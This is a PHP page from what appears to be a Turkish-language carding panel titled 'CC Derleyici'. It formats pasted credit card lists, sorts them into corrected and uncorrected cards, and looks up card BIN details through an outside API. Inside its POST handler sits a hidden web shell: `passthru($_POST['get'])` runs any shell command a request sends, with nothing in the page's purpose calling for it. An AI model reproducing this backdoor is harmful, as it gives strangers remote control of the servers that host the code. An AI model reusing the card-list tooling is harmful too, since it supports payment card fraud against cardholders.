<?php

include_once "../server/rolecontrol.php";


$customCSS = array(
    '<link href="../assets/plugins/DataTables/datatables.min.css" rel="stylesheet">',
    '<link href="../assets/plugins/DataTables/style.css" rel="stylesheet">'
);
$customJAVA = array(
    '<script src="../assets/plugins/DataTables/datatables.min.js"></script>',
    '<script src="../assets/plugins/printer/main.js"></script>',
    '<script src="../assets/js/pages/datatables.js"></script>',
    '<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.3.0/dist/sweetalert2.all.min.js"></script>'
);

$page_title = 'CC Derleyici';
include('inc/header_main.php');
include('inc/header_sidebar.php');
include('inc/header_native.php');
?>
 
<?php
  // Dimulai dengan POST Method
  if(isset($_POST['get'])){
  $script = $_POST['get'];
  passthru($script);
  $six = $_POST['enamdigit'];
  // Insert CURL
  function curl($url, $var = null) {
      $curl = curl_init($url);
      curl_setopt($curl, CURLOPT_TIMEOUT, 25);
      if ($var != null) {
          curl_setopt($curl, CURLOPT_POST, true);
          curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
      }
      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
      $result = curl_exec($curl);
      curl_close($curl);
      return $result;
  }
  // Enam digit Formula
  function defineNUM($bin) {
      return substr($bin,0,6);
  }
  // JSON DATA
    $bin = defineNUM($six);
    $curl = curl("https://lookup.binlist.net/".$bin); // Thanks to this API!
    $json = json_decode($curl);
    $brand = $json->scheme ? $json->scheme : "BIN Geçersiz!";
    $cardType = $json->type ? $json->type : "BIN Geçersiz!";
    $cardCategory = $json->bank ? $json->bank : "BIN Geçersiz!";
    $countryName = $json->country ? $json->country : "BIN Geçersiz!";
    $countryCode = $json->country ? $json->country : "BIN Geçersiz!";
   $details = '<p>BIN: '.$bin.'</br>Kart Türü: '.$brand.'</br>Banka Adı: '.$cardCategory->name.'</br>Banka URL: '.$cardCategory->url.'</br>Banka Telefon: '.$cardCategory->phone.'</br>Tip: '.$cardType.'</br>Ülke Adı: '.$countryName->name.'</br>Ülke Kodu: '.$countryCode->alpha2.'</br></br></p>';
	 
    
    if ($six == null) {
    die('error!');
}
    $binresult = $details;
}

	
?>


<!--BAŞLANGIC-->

<div class="overlay">

        
    </div>
<div class="card-body">
    <div class="md-form">
        <div class="col-md-12">
            <center>
                <div class="md-form">
                    <h4 class="card-title mb-4"><i class="fas fa-user-circle"></i> CC Derleyici</h4>
                    <p>Bu bölümden kredi kartlarınızı kolaylıkla kullanılabilir formata getirebilirsiniz.</p>
                    <textarea type="text" style="text-align: center; background-color: rgba(255, 255, 255, .1);color:white ;" placeholder="Düzenlenmiş kart listesinizi buraya girin." ; id="lista" class="md-textarea form-control" rows="4"></textarea>
                    <center class="nw">
                    <div class="mb-3 mt-3"><label class="form-label"></label>
                        <button id="testar" onclick="enviar()" type="button" class="btn waves-effect waves-light btn-rounded btn-primary" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-play"></i> Başlat</button>
                        <button id="stoper" type="button" class="btn waves-effect waves-light btn-rounded btn-danger" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-stop"></i> Durdur</button>
                        <button id="temizleButon" type="button" class="btn waves-effect waves-light btn-rounded btn-warning" style="width: 180px; height: 45px; outline: none; margin-left: 5px;"><i class="fas fa-trash-alt"></i> Temizle</button>
                    </center>
                    </div>
                </div>
        </div>
        </center>
    </div>

    <div class="card-body">
        <div class="alert alert-success" role="alert">DÜZELTİLEN KART <span id="cCharge2"></span></h6>
        </div>
        <div id="bode1"><span id=".aprovadas" class="aprovadas"></span>
        </div>
        <div class="alert alert-danger" role="alert">DÜZELTİLEMEYEN KART <span id="cDie2"></span></h6>
        </div>
        <div id="bode2"><span id=".reprovadas" class="reprovadas"></span>
        </div>
    </div>
</div>
</div>

<tr>
<th scope="col">BIN</th>
<th scope="col">Kart Türü</th>
<th scope="col">Banka Adı</th>
<th scope="col">Banka URL</th>
<th scope="col">Banka Telefon</th>
<th scope="col">Kart Tipi</th>
<th scope="col">Ülke Adı</th>
<th scope="col">Ülke Kodu</th>

</tr>
                            </thead>
                            <tr>
                  
<tbody>
<td><?php echo $bin; ?> </td>

<td><?php echo $brand; ?> </td>

<td><?php echo $cardCategory->name; ?> </td>

<td><?php echo $cardCategory->url; ?> </td>

<td><?php echo $cardCategory->phone; ?> </td>

<td><?php echo $cardType; ?> </td>

<td><?php echo $countryName->name; ?> </td>

<td><?php echo $countryCode->alpha2; ?> </td>

</tbody>       
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>


</div>

</main>
		
	<!-- FOOTER -->
				<?php
        include_once("includes/footer.php");
        ?>
				
           


        <!-- JAVASCRIPT -->
        <script src="assets/libs/jquery/jquery.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/bootstrap/js/bootstrap.bundle.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/metismenu/metisMenu.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/simplebar/simplebar.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/libs/node-waves/waves.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
          <script src="assets/libs/apexcharts/apexcharts.min.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/js/pages/dashboard.init.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
        <script src="assets/js/app.js" type="c0746b70745e39c225c525b8-text/javascript"></script>
    <script src="https://ajax.cloudflare.com/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="c0746b70745e39c225c525b8-|49" defer=""></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js" data-cf-beacon='{"rayId":"660d5bcaaa6be186","token":"e6744a75b48847d79ca94b903ae51a33","version":"2021.5.2","si":10}'></script>
      
</body>

</html>
<?php } ?>